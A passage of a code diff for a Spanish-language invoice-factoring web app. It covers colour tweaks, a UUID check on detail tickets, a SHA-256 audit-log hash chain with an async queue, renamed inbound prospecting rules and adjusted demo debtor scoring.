@@ -4,7 +4,7 @@ import {
   ChevronUp, ChevronLeft, X, Check, Calendar, Star, ArrowUpRight, ArrowDownRight,
   CircleDot, Sparkles, User, MessageSquare, Plus, Pencil, Zap, Clock,
   Play, Pause, RotateCcw, Radio, ArrowRight, AlertTriangle, Calculator, Eye, EyeOff, BarChart2, Trash2, Target, ShieldCheck, Settings, ClipboardList, Send,
-  LayoutGrid, Grid3x3,
+  LayoutGrid, Grid3x3, Upload,
 } from "lucide-react";
 import { ComposedChart, Bar, Line, XAxis, YAxis, ReferenceLine, ResponsiveContainer, CartesianGrid, Tooltip, Cell } from "recharts";
 import { sankey as d3sankey, sankeyLinkHorizontal, sankeyLeft } from "d3-sankey";
@@ -58,7 +58,7 @@ const SESION_ID = (() => {
   return (d[0].toString(36) + d[1].toString(36)).slice(0, 8);
 })();
 const LOG_NIVELES = [
-  { k: "error", label: "Error", color: "#DC2626", bg: "#FEF2F2" },
+  { k: "error", label: "Error", color: "#EF4444", bg: "#FEF2F2" },
   { k: "warn", label: "Aviso", color: "#C2410C", bg: "#FFF7ED" },
   { k: "info", label: "Info", color: "#2563EB", bg: "#EFF6FF" },
   { k: "debug", label: "Detalle", color: "#6B7280", bg: "#F3F4F6" },
@@ -66,7 +66,7 @@ const LOG_NIVELES = [
 const nivelMeta = (k) => LOG_NIVELES.find((n) => n.k === k) || LOG_NIVELES[2];
 // Subsistema emisor. Se declara la lista completa para que el filtro del visor sea estable aunque una
 // fuente todavía no haya emitido nada en esta sesión.
-const LOG_FUENTES = ["app", "motor", "inbound", "background", "cierre-dia", "storage", "politica", "repositorio", "otorgamiento", "curse"];
+const LOG_FUENTES = ["app", "motor", "inbound", "background", "cierre-dia", "storage", "politica", "repositorio", "otorgamiento", "curse", "contrato"];
 // ── Formato de línea de log ─────────────────────────────────────────────────────────────────────
 // Se escribe como un log de servidor de verdad, no como un volcado de JSON: timestamp ISO con offset,
 // nivel alineado, sesión, fuente y mensaje; los datos estructurados van al final tras « | ». Así el
@@ -198,8 +198,13 @@ function emitirTicketDetalle(tipo, id, usuario, payload) {
   return uuid;
 }
 // Canjea el ticket: verifica vigencia, esquema y tipo, y lo INVALIDA (un solo uso). Devuelve el payload.
+// Formato de UUID v4. El uuid llega por la URL y se concatena a una clave de localStorage: validar la
+// forma antes de tocar el storage evita que un `t` arbitrario sirva para sondear otras claves y deja
+// fuera, de una, cualquier intento de canje con basura.
+const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
 function canjearTicketDetalle(uuid, tipo) {
   try {
+    if (!UUID_RE.test(String(uuid || ""))) { logSys("warn", "app", "Ticket de detalle con formato inválido: descartado", { largo: String(uuid || "").length }); return null; }
     const raw = localStorage.getItem("fs_tk_" + uuid); if (!raw) return null;
     localStorage.removeItem("fs_tk_" + uuid); // un solo uso: recargar la pestaña no reabre el ticket
     const t = JSON.parse(raw);
@@ -412,9 +417,9 @@ const SCHEMA_VERSION = {
   reglasInbound: 3,  // reglas de clasificación del inbound
   cfgOper: 1,        // configuración operativa y de pricing por tenant
   permisos: 1,       // permisos de visibilidad por usuario
-  auditoria: 1,      // bitacora de auditoria encadenada
+  auditoria: 2,      // bitacora de auditoria encadenada (v2: cadena SHA-256, antes hash de 32 bits)
   auth: 1,           // intentos fallidos y bloqueo por cuenta
-  curse: 2,          // payload de curse por negocio (v2: OTP hasheado en vez de OTP en claro)
+  curse: 3,          // payload de curse por negocio (v3: OTP con SHA-256 + sal; v2 usaba un hash de 32 bits)
   snapshot: 1,       // snapshots de deal/operación para abrir en otra pestaña
   syslog: 1,         // log técnico persistido entre sesiones
 };
@@ -593,7 +598,7 @@ if (typeof window !== "undefined") {
 const C = {
   page: "#FFFFFF", ink: "#050015", sub: "#6B7280", faint: "#9CA3AF", line: "#E5E7EB",
   indigo: "#703EFF", green: "#16a34a", greenBg: "#F0FDF4", amber: "#C2410C", amberBg: "#FFF7ED",
-  red: "#dc2626", redBg: "#fef2f2", taskBg: "#F0FDF4", ruleBg: "#FAF9FB",
+  red: "#EF4444", redBg: "#fef2f2", taskBg: "#F0FDF4", ruleBg: "#FAF9FB",
   navy: "#230C65", lilac: "#F1ECFF",
 };
 
@@ -655,7 +660,7 @@ const displayStageId = (d) => (d && d.stage === "giro" ? "aceptadas" : (d && d.s
 // Etiquetas para el usuario (español).
 const STATUS_LBL = { open: "Abierta", closed: "Cerrada" };
 const RESULT_LBL = { won: "Ganada", lost: "Perdida", expired: "Expirada" };
-const RESULT_COL = { won: { bg: "#F0FDF4", fg: "#16A34A" }, lost: { bg: "#fef2f2", fg: "#DC2626" }, expired: { bg: "#FFF7ED", fg: "#C2410C" } };
+const RESULT_COL = { won: { bg: "#F0FDF4", fg: "#16A34A" }, lost: { bg: "#fef2f2", fg: "#EF4444" }, expired: { bg: "#FFF7ED", fg: "#C2410C" } };
 const DISBURSEMENT_LBL = { pending: "Giro pendiente", disbursed: "Girada" };
 const PAGE_SIZE = 8; // tarjetas por página en cada etapa (optimizado para 1800px)
 
@@ -665,8 +670,8 @@ function ConfirmDialog({ abierto, titulo, descripcion, etiquetaConfirmar, onConf
   return (
     <div className="fixed inset-0 flex items-center justify-center ovl p-6" style={{ zIndex: 70 }} onClick={onCancelar}>
       <div onClick={(e) => e.stopPropagation()} className="w-full bg-white p-8 text-center" style={{ maxWidth: 480, borderRadius: 20, boxShadow: "0 20px 60px rgba(0,0,0,0.18)" }}>
-        <div className="mx-auto mb-5 flex items-center justify-center rounded-full" style={{ width: 52, height: 52, border: "2px solid #DC2626" }}>
-          <X size={24} style={{ color: "#DC2626" }} />
+        <div className="mx-auto mb-5 flex items-center justify-center rounded-full" style={{ width: 52, height: 52, border: "2px solid #EF4444" }}>
+          <X size={24} style={{ color: "#EF4444" }} />
         </div>
         <div className="font-bold" style={{ fontSize: 22, color: C.ink }}>{titulo}</div>
         <div className="mt-2 t13" style={{ color: C.sub }}>{descripcion}</div>
@@ -764,29 +769,59 @@ const AUDIT_MAX = 1000;          // cota de lo que se conserva en el navegador
 let AUDIT_DESCARTADOS = 0;       // cuántos se soltaron por la cota: nunca en silencio
 let AUDIT_INTEGRIDAD = null;     // null = sin verificar · {ok} · {ok:false, en}
 let AUDIT_FLUSH_T = null;
-const auditHuella = (r, previo) => String(hashStr([previo || "", r.id, r.ts, r.usuario, r.modulo, r.accion, r.glosa, r.empresaId, r.exito ? "1" : "0"].join("|")));
-function persistirAuditoria() {
+const auditHuella = (r, previo) => sha256Hex([previo || "", r.id, r.ts, r.usuario, r.modulo, r.accion, r.glosa, r.empresaId, r.exito ? "1" : "0"].join("|"));
+// SHA-256 es asíncrono, pero la cadena tiene que encadenarse EN ORDEN. Esta cola serializa el cálculo:
+// cuando le toca a un registro, el anterior ya tiene su huella. `registrarAuditoria` sigue siendo
+// síncrona (la llaman ~100 sitios) y la huella se completa un tick después.
+let AUDIT_COLA = Promise.resolve();
+async function persistirAuditoria() {
+  if (!storageDisponible()) return;
+  // `AUDIT_COLA.then(...)` capturaba la cola de ESE instante: un registro encolado durante la espera se
+  // serializaba igual sin huella. Y crypto.subtle.digest resuelve en una TAREA, no en microtask, así que
+  // un setTimeout ya encolado le gana la carrera. Se drena en bucle hasta que la cola deja de crecer.
+  let c = null;
+  while (c !== AUDIT_COLA) { c = AUDIT_COLA; try { await c; } catch (e) { /* una huella fallida no bloquea el resto */ } }
   try {
-    if (!storageDisponible()) return;
-    window.localStorage.setItem(AUDIT_KEY, JSON.stringify({ _v: SCHEMA_VERSION.auditoria, _app: APP_VERSION, _ts: Date.now(), descartados: AUDIT_DESCARTADOS, datos: AUDIT_LOG.slice(0, AUDIT_MAX) }));
+    // Sólo registros REALES: la semilla no es evidencia y no tiene por qué ocupar la cota ni viajar
+    // entre sesiones. Se reconoce por no tener `hAlg`, que registrarAuditoria pone siempre.
+    const datos = AUDIT_LOG.filter((r) => r.hAlg).slice(0, AUDIT_MAX);
+    window.localStorage.setItem(AUDIT_KEY, JSON.stringify({ _v: SCHEMA_VERSION.auditoria, _app: APP_VERSION, _ts: Date.now(), descartados: AUDIT_DESCARTADOS, datos }));
   } catch (e) { /* sin logSys: registrar el fallo dispararía otra persistencia */ }
 }
 // Recorre la cadena del más antiguo al más nuevo y comprueba cada eslabón.
-function verificarAuditoria(lista) {
+async function verificarAuditoria(lista) {
+  let c = null;
+  while (c !== AUDIT_COLA) { c = AUDIT_COLA; try { await c; } catch (e) { /* noop */ } }
   const arr = (lista || AUDIT_LOG).slice().reverse(); // cronológico
   let previo = "";
+  const incompletos = [];
   for (const r of arr) {
-    if (!r.h) continue; // registros de la semilla histórica, sin cadena
-    if (r.h !== auditHuella(r, previo)) return { ok: false, en: r.id, ts: r.ts };
+    if (!r.h) {
+      // Sin hAlg = semilla histórica, nunca tuvo cadena. Con hAlg = registro NUESTRO cuya huella no
+      // alcanzó a persistirse: eso es un HUECO de integridad, no una alteración, y hay que decirlo en
+      // vez de callarlo. En ambos casos se reencadena desde "", que es con lo que firmó el siguiente.
+      if (r.hAlg) incompletos.push(r.id);
+      previo = "";
+      continue;
+    }
+    if (r.hAlg !== HASH_ALG) { previo = r.h; continue; } // cadena de otra época (migración de algoritmo)
+    if (!igualConstante(r.h, await auditHuella(r, previo))) return { ok: false, en: r.id, ts: r.ts };
     previo = r.h;
   }
-  return { ok: true, n: arr.length };
+  return incompletos.length ? { ok: true, n: arr.length, incompletos } : { ok: true, n: arr.length };
 }
 function registrarAuditoria(e) {
   const ts = e.ts || Date.now();
   const r = { id: "au" + ts + "_" + (++AUDIT_SEQ).toString(36), usuario: e.usuario || "-- Sistema --", modulo: e.modulo || "Sistema", glosa: e.glosa || "", accion: e.accion || "Navegación", exito: e.exito !== false, empresaId: e.empresaId || "", ts, ...auditFechaHora(ts) };
-  r.h = auditHuella(r, AUDIT_LOG.length ? AUDIT_LOG[0].h : "");
+  const previo = AUDIT_LOG.length ? AUDIT_LOG[0] : null;
+  r.hAlg = HASH_ALG;
   AUDIT_LOG.unshift(r);
+  AUDIT_COLA = AUDIT_COLA.then(async () => {
+    r.h = await auditHuella(r, previo ? previo.h : "");
+    // Una huella que llega tarde vuelve a pedir flush: cierra el caso del usuario que cierra la pestaña
+    // justo después de persistir, que dejaba ese registro sin huella para siempre.
+    if (AUDIT_FLUSH_T == null) AUDIT_FLUSH_T = setTimeout(() => { AUDIT_FLUSH_T = null; persistirAuditoria(); }, 0);
+  }).catch(() => {});
   if (AUDIT_LOG.length > AUDIT_MAX) { AUDIT_DESCARTADOS += AUDIT_LOG.length - AUDIT_MAX; AUDIT_LOG.length = AUDIT_MAX; }
   if (AUDIT_FLUSH_T == null) AUDIT_FLUSH_T = setTimeout(() => { AUDIT_FLUSH_T = null; persistirAuditoria(); }, 1200);
   AUDIT_SUBS.forEach((fn) => { try { fn(); } catch (x) { /* noop */ } });
@@ -805,9 +840,14 @@ function usarAuditoria() {
   if (Array.isArray(prev) && prev.length) {
     AUDIT_LOG.push(...prev.slice(0, AUDIT_MAX));
     AUDIT_DESCARTADOS = (raw && raw.descartados) || 0;
-    AUDIT_INTEGRIDAD = verificarAuditoria();
-    if (AUDIT_INTEGRIDAD.ok) logSys("info", "app", `Auditoría recuperada: ${prev.length} registro(s), cadena de integridad correcta`, { registros: prev.length, descartados: AUDIT_DESCARTADOS });
-    else logSys("error", "app", `AUDITORÍA ALTERADA: la cadena de integridad se rompe en el registro ${AUDIT_INTEGRIDAD.en}. Alguien editó o eliminó registros del almacenamiento.`, { registro: AUDIT_INTEGRIDAD.en });
+    // La verificación es asíncrona (SHA-256): el arranque no se bloquea y el resultado se publica al
+    // resolver. Hasta entonces AUDIT_INTEGRIDAD queda en null, que es "todavía no se sabe".
+    verificarAuditoria().then((res) => {
+      AUDIT_INTEGRIDAD = res;
+      if (res.ok && res.incompletos) logSys("warn", "app", `Auditoría recuperada: ${prev.length} registro(s). ${res.incompletos.length} sin huella (no verificables): se persistieron antes de calcular su hash.`, { registros: prev.length, incompletos: res.incompletos.length, alg: HASH_ALG });
+      else if (res.ok) logSys("info", "app", `Auditoría recuperada: ${prev.length} registro(s), cadena de integridad correcta`, { registros: prev.length, descartados: AUDIT_DESCARTADOS, alg: HASH_ALG });
+      else logSys("error", "app", `AUDITORÍA ALTERADA: la cadena de integridad se rompe en el registro ${res.en}. Alguien editó o eliminó registros del almacenamiento.`, { registro: res.en });
+    });
   } else {
     AUDIT_INTEGRIDAD = { ok: true, n: 0 };
   }
@@ -819,8 +859,11 @@ function usarSysLog() {
   useEffect(() => { const fn = () => setV((v) => v + 1); SYS_SUBS.add(fn); return () => { SYS_SUBS.delete(fn); }; }, []);
   return SYS_LOG;
 }
-// Semilla determinística de eventos históricos del sistema.
+// Semilla determinística de eventos históricos del sistema. Sólo en el PRIMER arranque: si ya se
+// restauró auditoría real, volver a inyectarla mete registros con ts de hoy por delante de la cadena
+// y va comiendo la cota AUDIT_MAX con 60 registros por carga.
 (function seedAuditoria() {
+  if (AUDIT_LOG.length) return;
   const rnd = pcRng(20260703);
   const nombres = Object.values(EXECS).concat(["Mauricio Thibaut", "-- Sistema --", "-- Sistema --", "-- Sistema --"]);
   const eventos = [
@@ -863,8 +906,8 @@ let CFG_TRAMOS = [
 ];
 const AREA_LBL = { riesgo: "Riesgo", comercial: "Comercial", operaciones: "Operaciones" };
 const GRAV_LBL = { leve: "Leve", moderado: "Moderado", grave: "Grave", critico: "Crítico" };
-const GRAV_COLOR = { leve: { bg: "#F0FDF4", fg: "#16A34A" }, moderado: { bg: "#FFF7ED", fg: "#C2410C" }, grave: { bg: "#fff7ed", fg: "#c2410c" }, critico: { bg: "#fef2f2", fg: "#DC2626" } };
-const AREA_COLOR = { riesgo: { bg: "#fef2f2", bg2: "#FECACA", fg: "#DC2626" }, comercial: { bg: "#F1ECFF", bg2: "#E4DBFF", fg: "#5B21D6" }, operaciones: { bg: "#f0fdfa", bg2: "#ccfbf1", fg: "#0f766e" } };
+const GRAV_COLOR = { leve: { bg: "#F0FDF4", fg: "#16A34A" }, moderado: { bg: "#FFF7ED", fg: "#C2410C" }, grave: { bg: "#fff7ed", fg: "#c2410c" }, critico: { bg: "#fef2f2", fg: "#EF4444" } };
+const AREA_COLOR = { riesgo: { bg: "#fef2f2", bg2: "#FECACA", fg: "#EF4444" }, comercial: { bg: "#F1ECFF", bg2: "#E4DBFF", fg: "#5B21D6" }, operaciones: { bg: "#f0fdfa", bg2: "#ccfbf1", fg: "#0f766e" } };
 // Atribución por usuario (área → nivel) y tipo (pipeline = comercial dueña; aprobador = mesa Riesgo/Operaciones).
 let ATRIB_USUARIO = {
   // Ejecutivos (pipeline): originan y gestionan operaciones, NO aprueban excepciones — sin atribución.
@@ -903,7 +946,7 @@ const tipoActivo = (cod) => { const t = TIPOS_DESVIO.find((x) => x.codigo === co
 const DISP_META = {
   aprobada:  { l: "Aprobada", bg: "#F0FDF4", fg: "#16A34A" },
   sujeto:    { l: "Sujeto a aprobación", bg: "#F3F4F6", fg: "#4B5563" },
-  rechazada: { l: "Rechazada", bg: "#fef2f2", fg: "#DC2626" },
+  rechazada: { l: "Rechazada", bg: "#fef2f2", fg: "#EF4444" },
 };
 const UNIDADES_CRIT = ["$", "MM", "%", "pp", "días", "meses"];
 // Operadores de comparación para cada rango del criterio (se evalúan en orden; primer match gana).
@@ -1005,25 +1048,25 @@ const INBOUND_RULES = [
     desc: "Busca facturas de buenos deudores cuyo negocio se está yendo a la competencia y las promociona con una mejor tasa.",
     criterio: ["Buena factura", "SOW a la baja"],
     periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas", "AI Agent"], accion: "Pipeline Factoring", activa: true },
-  { id: "Rule-02", title: "Deudor Lista Blanca — Clientes", unidad: "Factura", monto: "—",
-    desc: "Busca facturas de deudores de Lista Blanca de clientes actuales y les ofrece el anticipo al instante por WhatsApp.",
-    criterio: ["Buena factura", "Deudor Lista Blanca", "Cliente"],
+  { id: "Rule-02", title: "Deudores Prime — Clientes", unidad: "Factura", monto: "—",
+    desc: "Busca facturas de deudores de la Lista Prime (Lista Blanca y Autorizados) de clientes actuales y les ofrece el anticipo al instante por WhatsApp.",
+    criterio: ["Buena factura", "Lista Deudores Prime", "Cliente"],
     periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas", "AI Agent"], accion: "Pipeline Factoring", activa: true },
-  { id: "Rule-03", title: "Deudor Lista Blanca — Prospecto", unidad: "Factura", monto: "—",
-    desc: "Busca facturas de deudores de Lista Blanca de empresas que aún no son clientes y las pasa a un ejecutivo para captar al cliente.",
-    criterio: ["Buena factura", "Deudor Lista Blanca", "No Cliente"],
+  { id: "Rule-03", title: "Deudores Prime — Prospecto", unidad: "Factura", monto: "—",
+    desc: "Busca facturas de deudores de la Lista Prime de empresas que aún no son clientes y las pasa a un ejecutivo para captar al cliente.",
+    criterio: ["Buena factura", "Lista Deudores Prime", "No Cliente"],
     periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas", "Ejecutivo"], accion: "Pipeline Factoring", activa: true },
-  { id: "Rule-04", title: "Deudores Autorizados — Clientes", unidad: "Factura", monto: "—",
-    desc: "Busca facturas de deudores autorizados de clientes actuales y las gestiona automáticamente con el Agente IA.",
-    criterio: ["Buena factura", "Deudor Autorizado", "Cliente"],
+  { id: "Rule-04", title: "Deudores ND>4,2 — Clientes", unidad: "Factura", monto: "—",
+    desc: "Busca facturas de deudores que alcanzan la Nota de corte (4,2) sin estar en la Lista Prime, de clientes actuales, y las gestiona automáticamente con el Agente IA.",
+    criterio: ["Buena factura", "Lista Deudores ND>4.2", "Cliente"],
     periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas", "AI Agent"], accion: "Pipeline Factoring", activa: true },
-  { id: "Rule-05", title: "Deudores Autorizados — Prospecto", unidad: "Factura", monto: "—",
-    desc: "Busca facturas de deudores autorizados de empresas nuevas y arma una tarea para incorporar al cliente por email.",
-    criterio: ["Buena factura", "Deudor Autorizado", "No Cliente"],
+  { id: "Rule-05", title: "Deudores ND>4,2 — Prospecto", unidad: "Factura", monto: "—",
+    desc: "Busca facturas de deudores con Nota sobre 4,2 de empresas nuevas y arma una tarea para incorporar al cliente por email.",
+    criterio: ["Buena factura", "Lista Deudores ND>4.2", "No Cliente"],
     periodicidad: "Cada día", nueva: "Cada 30 días", canales: ["Auto", "Empresas"], accion: "Task Onb. Factoring", activa: true },
-  { id: "Rule-06", title: "Histórico BICE — re-anticipar", unidad: "Factura", monto: "—",
-    desc: "Busca facturas de deudores que el cliente ya factorizó con BICE en el último año (aunque no estén en Lista Blanca/Autorizados) y le ofrece volver a anticiparlas. Cuenta como CAT1.",
-    criterio: ["Buena factura", "Histórico BICE"],
+  { id: "Rule-06", title: "Históricos Security sin bloqueo — re-anticipar", unidad: "Factura", monto: "—",
+    desc: "Busca facturas de deudores que el cliente ya factorizó con Security en el último año y que no tienen bloqueo vigente (aunque no estén en la Lista Prime) y le ofrece volver a anticiparlas. Cuenta como CAT1.",
+    criterio: ["Buena factura", "Deudores históricos Security sin Bloqueo"],
     periodicidad: "Evento", nueva: "Cada ocurrencia", canales: ["Auto", "Facturas", "AI Agent"], accion: "Pipeline Factoring", activa: true },
   { id: "Rule-07", title: "Histórico otro factor — recuperar", unidad: "Factura", monto: "—",
     desc: "Busca facturas de deudores que el cliente factorizó con OTRO factor en el último año y arma la oportunidad para recuperar ese negocio. Cuenta como CAT4 (recuperable).",
@@ -1280,7 +1323,7 @@ const CAT_META = {
   "CAT-2": { bg: "#eff6ff", fg: "#2563EB", q: "mayoría muy buenos", desc: "Al menos 50% del monto en deudores muy buenos (Nota > 4,6)." },
   "CAT-3": { bg: "#ecfeff", fg: "#0e7490", q: "buenos/normales", desc: "Al menos 80% del monto en deudores buenos o normales (Nota ≥ 3,7)." },
   "CAT-4": { bg: "#fff7ed", fg: "#c2410c", q: "límite de compra", desc: "Peso relevante de deudores en el límite inferior de compra (Nota 3,2–3,7)." },
-  "CAT-5": { bg: "#fef2f2", fg: "#DC2626", q: "deudor malo / sin nota", desc: "La operación incorpora facturas de deudores con Nota < 3,2 o sin nota por sobre la tolerancia del 5% del monto → gatilla otorgamiento. El subtipo 5A–5D indica la CAT del resto de la operación." },
+  "CAT-5": { bg: "#fef2f2", fg: "#EF4444", q: "deudor malo / sin nota", desc: "La operación incorpora facturas de deudores con Nota < 3,2 o sin nota por sobre la tolerancia del 5% del monto → gatilla otorgamiento. El subtipo 5A–5D indica la CAT del resto de la operación." },
 };
 const catMeta = (c) => CAT_META[c] || CAT_META[(c || "").slice(0, 5)] || CAT_META["CAT-1"];
 // Clasificación corta + chip de color por tipo de deudor.
@@ -1299,16 +1342,35 @@ function scoreDeudor(name, tipoArg) {
   // Si se pasa el tipo ya clasificado por la factura (por RUT), se respeta; si no, se infiere por nombre.
   const tipo = tipoArg || tipoDeudor(null, name);
   const h = hashStr((name || "").toLowerCase());
-  const atraso = tipo === "Lista Blanca" ? (h % 6) : tipo === "Deudor Autorizado" ? 2 + (h % 13) : tipo === "Histórico BICE" ? 2 + (h % 10) : tipo === "Histórico" ? 4 + (h % 16) : 5 + (h % 28); // días de atraso promedio
-  const base = tipo === "Lista Blanca" ? 97 : tipo === "Deudor Autorizado" ? 88 : tipo === "Histórico BICE" ? 86 : tipo === "Histórico" ? 80 : 74;
+  // Una MINORÍA de los deudores no listados paga excelente: es la población que la lista ND>4,2
+  // existe para capturar. Sin ella el tramo quedaba vacío —medido: 0 de 4.000 facturas del stream— y
+  // las reglas de ND>4,2 no podían disparar nunca. Es determinista por nombre: el mismo deudor cae
+  // siempre del mismo lado. No cambia su LISTA (sigue siendo "Otro" para CAT y para el otorgamiento),
+  // sólo su comportamiento de pago, que es lo que la Nota mide.
+  const otroBuenPagador = tipo !== "Lista Blanca" && tipo !== "Deudor Autorizado" && tipo !== "Histórico BICE" && tipo !== "Histórico" && (h % 100) < 12;
+  const atraso = tipo === "Lista Blanca" ? (h % 6) : tipo === "Deudor Autorizado" ? 2 + (h % 13) : tipo === "Histórico BICE" ? 2 + (h % 10) : tipo === "Histórico" ? 4 + (h % 16) : otroBuenPagador ? (h % 5) : 5 + (h % 28); // días de atraso promedio
+  const base = tipo === "Lista Blanca" ? 97 : tipo === "Deudor Autorizado" ? 88 : tipo === "Histórico BICE" ? 86 : tipo === "Histórico" ? 80 : otroBuenPagador ? 90 : 74;
   const score = Math.max(20, Math.min(99, Math.round(base - atraso * 1.7 + ((h >> 4) % 5) - 2)));
   return { tipo, atraso, score };
 }
-const scoreColor = (s) => (s >= 85 ? "#0a7d3f" : s >= 70 ? "#C2410C" : "#DC2626");
+const scoreColor = (s) => (s >= 85 ? "#0a7d3f" : s >= 70 ? "#C2410C" : "#EF4444");
 // ── NOTA DEUDOR (modelo de riesgo Security): calificación 1–5, siendo 5 el mejor pagador. Se deriva del
 // score de pago del deudor. La Nota y la verificación son POR DEUDOR (no por factura).
 const notaFromScore = (s) => Math.max(1, Math.min(5, +(1 + (s - 20) / 79 * 4).toFixed(1)));
-const NOTA_COLOR = (n) => (n >= 4 ? "#0a7d3f" : n >= 3 ? "#C2410C" : "#DC2626");
+// Corte de Nota Deudor que define el tramo prioritario. Lo comparten la prospección —qué deudores
+// abren oportunidad— y el motor de asignación de líneas —a quién se le asigna primero—: tiene que ser
+// el MISMO número, o el tubo y el detalle contarían historias distintas del mismo deudor.
+const NOTA_PRIORITARIA = 4.2;
+// BLOQUEO del deudor: mora, protestos o castigo vigente. Viene del motor de riesgo junto con la Nota;
+// en el demo es determinista por deudor (~6%) para que el mismo deudor esté siempre igual.
+const bloqueoDeudor = (k) => (Math.abs(hashStr("blq" + (k || ""))) % 100) < 6;
+// ¿Este deudor abre oportunidad? Está en una lista, o alcanza la Nota de corte.
+const deudorAbreOportunidad = (f) => !!(f && f.inboundBucket && f.inboundBucket !== "OTRO") || notaDeudorEvento(f) > NOTA_PRIORITARIA;
+// Nota del deudor de un evento del stream. Dos cuidados: el inbound trae `pagador`, no `deudor`; y
+// el tipo tiene que ser el MOSTRADO, no el crudo —para un histórico el campo `tipoDeudor` dice "Otro",
+// que puntúa 74 y deja su nota bajo el corte, así que la lista ND>4,2 no capturaba a nadie—.
+const notaDeudorEvento = (f) => notaFromScore(scoreDeudor((f && (f.pagador || f.deudor)) || "", tipoDeudorDisp(f)).score);
+const NOTA_COLOR = (n) => (n >= 4 ? "#0a7d3f" : n >= 3 ? "#C2410C" : "#EF4444");
 // VERIFICACIÓN por deudor: Security contacta al deudor para verificar telefónicamente que la factura existe,
 // que los bienes/servicios fueron recibidos y la fecha de pago. Para no hacerlo con todas las facturas, un
 // segundo modelo evalúa qué tan buen pagador es el deudor: si cumple todos los criterios, la operación queda
@@ -1340,63 +1402,169 @@ function verifDeudor(name, tipo) {
 // La verificación es POR FACTURA (documento), evaluada sobre el par cliente-deudor (3M). Reglas V0–V5;
 // V1 es REGLA DURA: su fallo deja la factura sujeta a verificación telefónica + excepción de Riesgo.
 const VERIF_RULES = [
-  { id: "V01", name: "Protocolo de Verificación del Deudor", dura: false, desc: "Si el deudor tiene protocolo propio de verificación, éste prevalece sobre el modelo", dom: "Riesgo", thr: "Existe → prevalece", fmt: (v) => (v ? "Existe" : "No existe"), test: () => true },
-  { id: "V02", name: "% Pagado por el Deudor (C-D, Ult3M)", dura: false, desc: "Monto pagado por el deudor sobre la cartera del par en los últimos 3 meses", dom: "Riesgo", thr: "≥ 90%", fmt: (v) => v == null ? "sin info" : v.toFixed(1) + "%", test: (v) => v != null && v >= 90 },
-  { id: "V03", name: "Monto Operación vs Promedio Compra C-D", dura: false, desc: "Monto del documento vs promedio de facturas operadas del par", dom: "Riesgo", thr: "≤ 1,3×", fmt: (v) => v == null ? "sin info" : v.toFixed(2) + "×", test: (v) => v != null && v <= 1.3 },
-  { id: "V04", name: "Monto Operación vs Relación Comercial C-D", dura: false, desc: "Monto de la operación vs venta promedio del par (L6M)", dom: "Riesgo", thr: "< 1,0×", fmt: (v) => v == null ? "sin info" : v.toFixed(2) + "×", test: (v) => v != null && v < 1.0 },
-  { id: "V05", name: "Recurrencia Relación C-D (Ult6M)", dura: false, desc: "Meses con venta C-D > 0 en los últimos 6, sin reclamos ni anulaciones", dom: "Riesgo", thr: "> 4 meses", fmt: (v) => v + " meses", test: (v) => v != null && v > 4 },
-  { id: "V06", name: "Diferencia Fecha de Pago vs Promedio", dura: false, desc: "Vencimiento del documento vs fecha promedio de pago del par", dom: "Riesgo", thr: "< 5 días", fmt: (v) => v + " días", test: (v) => v != null && v < 5 },
-  { id: "V07", name: "% Pagado con Mora >25 Días (C-D)", dura: false, desc: "Degradable intramés: mora del par en el mes en curso degrada el segmento Elite", dom: "Riesgo", thr: "< 3%", fmt: (v) => v.toFixed(1) + "%", test: (v) => v != null && v < 3 },
-  { id: "V08", name: "% Facturas Reclamadas (C-D)", dura: false, desc: "Degradable intramés: reclamos del par en el mes en curso degradan el segmento Elite", dom: "Riesgo", thr: "< 4%", fmt: (v) => v.toFixed(1) + "%", test: (v) => v != null && v < 4 },
-  { id: "V09", name: "Documento Alto Monto", dura: true, desc: "Documento sobre MM$300 fuerza verificación telefónica", dom: "Riesgo", thr: "≤ MM$300", fmt: (v) => "$" + v + "M", test: (v) => v != null && v <= 300 },
-  { id: "V10", name: "Historial de Pago Factoring Relevante (Ult3M)", dura: false, desc: "Pago del deudor Ult3M relevante: > 20× la operación ó > MM$1.500", dom: "Riesgo", thr: "> 20× ó > MM$1.500", fmt: (v) => "$" + Math.round(v) + "M pagados", test: null },
+  { id: "V01", n: 1, name: "Protocolo de verificación del deudor", variable: "ExisteProtocoloDeudor", dura: true, recortado: true, desc: "Si el deudor tiene protocolo propio de confirmación, hay que seguirlo: se verifica SIEMPRE usando ese protocolo", dom: "Riesgo", thr: "existe → verifica", fmt: (v) => (v ? "Existe" : "No existe") },
+  { id: "V02", n: 2, name: "Monto pagado por el deudor sobre la cartera (Ult3M)", variable: "MntPagoDeudorUlt3M / MntPagoUlt3M", dura: false, recortado: false, desc: "Qué parte de la obligación pagó el deudor y qué parte terminó pagando el cliente. Variable precalculada de refresco diario", dom: "Riesgo", thr: "≥ 90%", fmt: (v) => v == null ? "sin info" : v.toFixed(1) + "%" },
+  { id: "V03", n: 3, name: "Monto de la operación contra el promedio de compra", variable: "MntOpC-D / AvgMntFacturaOpCarteraC-D", dura: false, recortado: false, desc: "Crecimiento controlado: la operación no puede escaparse más de 30% de lo comprado a ese par en los 3 meses móviles anteriores", dom: "Riesgo", thr: "≤ 1,3×", fmt: (v) => v == null ? "sin info" : v.toFixed(2) + "×" },
+  { id: "V04", n: 4, name: "Monto de la operación contra la relación comercial", variable: "MntOpC-D / AvgVentaPromC-D 3M", dura: false, recortado: true, desc: "Regla antifraude: lo financiado del par no puede superar lo que cliente y deudor comercializan en promedio (libro de compraventa, 3M móviles)", dom: "Riesgo", thr: "< 1,0", fmt: (v) => v == null ? "sin info" : v.toFixed(2) + "×" },
+  { id: "V05", n: 5, name: "Estabilidad de la relación comercial (Ult6M)", variable: "Count(VentaMensualC-D > 0)", dura: false, recortado: true, desc: "Facturas válidas emitidas entre las partes en al menos 4 de los últimos 6 meses. Excluye reclamadas y anuladas", dom: "Riesgo", thr: "≥ 4 meses", fmt: (v) => v == null ? "sin info" : v + " meses" },
